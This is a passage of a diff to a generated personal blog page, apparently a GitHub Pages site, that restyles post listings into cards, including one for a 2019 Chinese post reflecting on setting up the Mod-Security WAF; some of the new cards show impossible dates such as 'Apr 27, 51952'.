-                    <div class="color-fg-success-icon scrollbar-16-16"></div><!--article GitHub action success.site.commitString-->
-                    
-                    <a class="d-flex color-fg-default px-md-6" href="https://github.com/Bin4xin/bin4xin.github.io/commit/d9452839" target="_blank">d9452839</a>
-                    <!--article author end-->
-
-<!-- site build time set to the latest time.-->
-
-<!-- post time-->
+            </span>
+            <!--article author end-->
 
 
 
 
 
-<div class="ml-hide">
-    <a class="f2 d-flex color-fg-default" href="https://github.com/Bin4xin" target="_blank">
+
+
+
+<span class="ymh-author-badge">
+    <a class="ymh-author-link" href="https://github.com/Bin4xin" target="_blank">
+        <span class="ymh-author-avatar">B</span>
         Bin4xin
-
-        
-            
-        post
-        
-
-        
-        
-        
-        
-        
-
-        
-            on Dec 26, 2019
-        
     </a>
-</div>
-                </div></csmall>
-            </div>
+
+    
+
+    
+    
+    
+    
+    
+
+    <span class="ymh-time-badge">
+        
+            Apr 27, 51952
+        
+    </span>
+</span>
+
+        </div>
+        <div class="blog-card-meta">
+            <span class="blog-card-status-dot"></span>
+            
+            <a class="blog-card-hash" href="https://github.com/Bin4xin/bin4xin.github.io/commit/8e82aae4" target="_blank">
+                8e82aae
+            </a>
         </div>
     </div>
 </div>
                 
                     
-                    <div class="py-2">
-    <div class="row blog-bar-display">
-        <div class="Box-header d-flex flex-justify-between"><!--box header-->
-            <a class="my-3 col-7 color-fg-default text-bold mb-1 lh-condensed css-truncate-target d-flex" style="max-width: 100%; font-size: 20px" href="/blog/2019/modsec-test/">《Mod-Security：有关「WAF」的爱恨情仇》</a>
-            <!--article title end-->
-            <a class="display-nav-li no-underline d-flex" href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/" target="_blank">
-                <span class="completeness-indicator completeness-indicator-problem">
-                   <span class="content-summary-icon scrollbar-20-20"></span>
-                </span>
+                    <div class="blog-card">
+    <div class="blog-card-header">
+        <a class="blog-card-title" href="/blog/2019/modsec-test/">
+            Mod-Security：有关「WAF」的爱恨情仇
+        </a>
+        <div class="blog-card-actions">
+            <a class="blog-card-action-btn" href="/blog/2019/modsec-test/" title="阅读全文">
+                <svg viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"/></svg>
             </a>
-            <!--article relation git repos <branch/md files.> end-->
-        </div><!--box header stop-->
-        <div class="Box-row">
-            <a class="d-flex flex-justify-around flex-column overflow-hidden flex-items-stretch" style="z-index: 2;" href="/blog/2019/modsec-test/"></a>
-            <div class="discussion-spotlight-details position-relative p-3 pr-5 css-truncate width-fit d-flex flex-column flex-items-start" style="z-index: 3;">
-                <a class="my-3 col-7 color-fg-default text-bold f3 no-underline d-flex flex-items-center mt-2" aria-label="elisemoe (author)">
-                    <span class="mr-1">添加于2021/02/05
+            
+            <a class="blog-card-action-btn" href="https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/blog/2019-12-25-modsec-test.md" target="_blank" title="编辑此页">
+                <svg viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Z"/></svg>
+            </a>
+            
+        </div>
+    </div>
+
+    
+    <div class="blog-card-body">
+        <p class="blog-card-excerpt">
+            添加于2021/02/05
 
 “朝花夕拾”
 
-这篇与WAF相关《技 术》博客其实没有多少技术含量，只是当时刚刚接触到WAF，感觉非常的新鲜然后有了这篇博客...</span></a>
-            </div>
-        </div>
-        <div class="Box-row discussion-spotlight-details position-relative py-2 pr-5 css-truncate width-fit d-flex flex-column flex-items-start" style="z-index: 3;">
-            <div class="d-flex nv0 f5 no-underline" style="font-family: 'DM Mono', monospace;">
-                <csmall><div class="d-flex items-center">
-                    <a class="author-avatar-small d-flex px-md-6">
-                        
+这篇与WAF相关《技 术》博客其实没有多少技术含量，只是当时刚刚接触到WAF，感觉非常的新鲜然后有了这篇博客，其实当时连LINUX基础常识都还不是非常的了解，
+年少轻狂的来配置WAF肯定无法成功；现在回头来看当时的文笔还是较为稚嫩，通篇都是一些”转述”的代码块，没有自己的相关思想，是很糟糕的一篇博客。
+
+刚好年底总结博客，总结到WAF这一块，正好把这一篇的文章给补上，整理文章可以查看，较于下面这篇文章，主要增加了自定义规则库...
+        </p>
+    </div>
+    
+
+    <div class="blog-card-footer">
+        <div class="blog-card-meta">
+            <span class="blog-card-author">
+                
 <img alt="Bin4xin" src="https://avatars.githubusercontent.com/u/57884471?v=4"/>
-                    </a>
-                    <!--article author avatar img. end-->
-                    <div class="color-fg-success-icon scrollbar-16-16"></div><!--article GitHub action success.site.commitString-->
-                    
-                    <a class="d-flex color-fg-default px-md-6" href="https://github.com/Bin4xin/bin4xin.github.io/commit/d9452839" target="_blank">d9452839</a>
-                    <!--article author end-->
-
-<!-- site build time set to the latest time.-->
-
-<!-- post time-->
+            </span>
+            <!--article author end-->
 
 
 
 
 
-<div class="ml-hide">
-    <a class="f2 d-flex color-fg-default" href="https://github.com/Bin4xin" target="_blank">
+
+
+
+<span class="ymh-author-badge">
+    <a class="ymh-author-link" href="https://github.com/Bin4xin" target="_blank">
+        <span class="ymh-author-avatar">B</span>
         Bin4xin
-
-        
-            
-            <!-- wrench time-->
-            
-        edited
-        
-
-        
-        
-        
-        
-        
-
-        
-            on Oct 20, 2022
-        
     </a>
-</div>
-                </div></csmall>
-            </div>
+
+    
+
+    
+    
+    
+    
+    
+
+    <span class="ymh-time-badge">
+        
+            Aug 1, 51949
+        
+    </span>
+</span>
+
+        </div>
+        <div class="blog-card-meta">
+            <span class="blog-card-status-dot"></span>
+            
+            <a class="blog-card-hash" href="https://github.com/Bin4xin/bin4xin.github.io/commit/8e82aae4" target="_blank">
+                8e82aae
+            </a>
         </div>
     </div>
 </div>
@@ -1218,7 +1292,7 @@
     </div>
     
     <p>
-    <details open>
+    <details>
         <summary class="point flex justify-between">所有标签/数量</summary>
         
         <p>
